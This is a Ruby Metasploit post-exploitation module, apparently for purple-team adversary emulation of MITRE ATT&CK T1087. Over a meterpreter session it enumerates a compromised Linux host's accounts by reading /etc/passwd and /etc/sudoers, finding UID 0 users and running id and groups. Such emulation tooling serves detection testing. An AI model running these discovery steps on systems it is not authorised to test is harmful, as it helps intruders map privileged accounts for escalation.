#
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

include Msf::Post::File
include Msf::Post::Linux::Priv
include Msf::Post::Linux::System

class MetasploitModule < Msf::Post

  def initialize(info={})
    super( update_info( info,
      'Name'          => 'Account Discovery (T1087) Linux - Purple Team',
      'Description'   => %q{
        Discovery:
        Adversaries may attempt to get a listing of local system or domain accounts
        Linux
        On Linux, local users can be enumerated through the use of the /etc/passwd file which is world readable. In mac, this same file is only used in single-user mode in addition to the /etc/master.passwd file.

        Also, groups can be enumerated through the groups and id commands.},
      'License'       => MSF_LICENSE,
      'Author'        => [ 'praetorian' ],
      'References'    => [ [ 'URL', 'https://attack.mitre.org/wiki/Technique/T1087' ] ],
      'Platform'      => [ 'linux' ],
      'SessionTypes'  => [ 'meterpreter' ]
    ))
  end

  def run

    begin
      print_status("Viewing accounts with UID 0")
      results = cmd_exec('/bin/grep "x:0:" /etc/passwd')
      print_good(results)

    rescue ::Exception => e
      print_error("Error getting account with UID 0: #{e.class} #{e}")
    end

    cmd = ['/bin/cat /etc/passwd', '/bin/cat /etc/sudoers', '/usr/bin/id', '/usr/bin/groups']
    cmd.each do |cmd|

      begin
        print_status("Executing #{cmd} on #{session.inspect}...")
        results = cmd_exec(cmd)
        print_good(results)

      rescue ::Exception => e
        print_error("Error running command #{cmd}: #{e.class} #{e}")

      end
    end
  end
end
